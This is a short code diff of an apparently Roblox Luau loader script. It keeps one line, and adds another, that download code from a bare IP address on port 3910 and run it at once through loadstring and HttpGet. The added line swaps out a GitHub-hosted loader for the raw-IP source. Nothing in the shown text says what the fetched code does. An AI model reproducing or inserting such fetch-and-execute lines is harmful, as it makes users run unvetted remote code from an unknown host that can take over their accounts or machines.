@@ -3,7 +3,7 @@ ID="7ada2f70-07ff-4d15-8206-e39f7501ce5f";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
 local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/Loading'))()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 end
 
 task.spawn(Dark)
